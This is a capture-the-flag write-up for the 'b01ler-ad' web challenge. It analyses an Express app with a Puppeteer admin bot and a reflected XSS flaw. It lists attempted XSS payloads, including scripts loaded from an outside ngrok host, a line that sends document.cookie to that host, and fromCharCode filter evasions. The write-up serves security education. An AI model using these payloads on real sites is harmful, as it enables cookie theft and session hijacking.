## b01ler-ad

## Description

Ads Ads Ads! Cheap too! You want an Ad on our site? Just let us know!

http://b01ler-ads.hammer.b01le.rs

## Solution

The only thing we have is `index.js` and `package.json`.
The packages used are: 

```json
    "cookie-parser": "^1.4.6",
    "dotenv": "^16.4.5",
    "ejs": "^3.1.9",
    "express": "^4.19.2",
    "express-rate-limit": "^7.2.0",
    "puppeteer": "^22.6.2"
```

Lets breakdown the code from index.js:

Endpoint that shows the main website of ads:
```js
app.get('/', (req, res) => {
  res.render('index.html');
})
```

Our goal, we need to get the flag cookie in order to access this endpoint:
```js
app.get('/admin/view', (req, res) => {
  if (req.cookies.flag === CONFIG.APPFLAG) {
    res.send(req.query.content);
  }
  else {
    res.send('You are not Walter White!');
  }
})
```

Basically there is a bot(puppeteer) that is used to verify the submission that we place in the main page.
It uses chrome and it only takes the content parameter from the request body and searches the `/admin/view` endpoint, then redirects to the main page.
It removes the following characters `, " and '.

```js
app.post('/review', limiter,  async (req, res) => {
  const initBrowser = puppeteer.launch({
      executablePath: "/opt/homebrew/bin/chromium",
      headless: true,
      args: [
          '--disable-dev-shm-usage',
          '--no-sandbox',
          '--disable-setuid-sandbox',
          '--disable-gpu',
          '--no-gpu',
          '--disable-default-apps',
          '--disable-translate',
          '--disable-device-discovery-notifications',
          '--disable-software-rasterizer',
          '--disable-xss-auditor'
      ],
      ignoreHTTPSErrors: true
  });
  const browser = await initBrowser;
  const context = await browser.createBrowserContext()
  const content = req.body.content.replace("'", '').replace('"', '').replace("`", '');
  const urlToVisit = CONFIG.APPURL + '/admin/view/?content=' + content;
  try {
      const page = await context.newPage();
      await page.setCookie({
          name: "flag",
          httpOnly: false,
          value: CONFIG.APPFLAG,
          url: CONFIG.APPURL
      })
      await page.goto(urlToVisit, {
          waitUntil: 'networkidle2'
      });
      await sleep(1000);
      // Close
      await context.close()
      res.redirect('/')
  } catch (e) {
      console.error(e);
      await context.close();
      res.redirect('/')
  }
})
```

So we have a clear XSS vulnerability in the admin/view endpoint:
```js
if (req.cookies.flag === CONFIG.APPFLAG) {
    res.send(req.query.content); <- XSS
  }
```
It receives a content parameter and displays it, since we pass the content to the bot and the bot passes to the endpoint we just need to bypass the filters and create a XSS that grabs a script from our domain. Bellow are some scripts that i have tried:

`content=<SCRIPT SRC=https://mutually-cheerful-meerkat.ngrok-free.app/xss.js?< B >`

`content=<SCRIPT SRC=https://mutually-cheerful-meerkat.ngrok-free.app/index.js></SCRIPT>`

`content=\<a src=https://mutually-cheerful-meerkat.ngrok-free.app/index.js\>xxs link\</a\>`

`content=\<script type=text/javascript\>document.location=https://mutually-cheerful-meerkat.ngrok-free.app/?c=+document.cookie;\</script\>`

`<IMG SRC=String.fromCharCode(104,116,116,112,115,58,47,47,109,117,116,117,97,108,108,121,45,99,104,101,101,114,102,117,108,45,109,101,101,114,107,97,116,46,110,103,114,111,107,45,102,114,101,101,46,97,112,112,47,105,110,100,101,120,46,106,115)>`

`<IMG SRC=javascript:String.fromCharCode(104,116,116,112,115,58,47,47,109,117,116,117,97,108,108,121,45,99,104,101,101,114,102,117,108,45,109,101,101,114,107,97,116,46,110,103,114,111,107,45,102,114,101,101,46,97,112,112,47,105,110,100,101,120,46,106,115)`


104 116 116 112 115 58 47 47 109 117 116 117 97 108 108 121 45 99 104 101 101 114 102 117 108 45 109 101 101 114 107 97 116 46 110 103 114 111 107 45 102 114 101 101 46 97 112 112 47 105 110 100 101 120 46 106 115 -> https://mutually-cheerful-meerkat.ngrok-free.app/index.js

In XSS filter evasion we have the following possibilities:

<https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#fromcharcode>
<https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#malformed-a-tags>
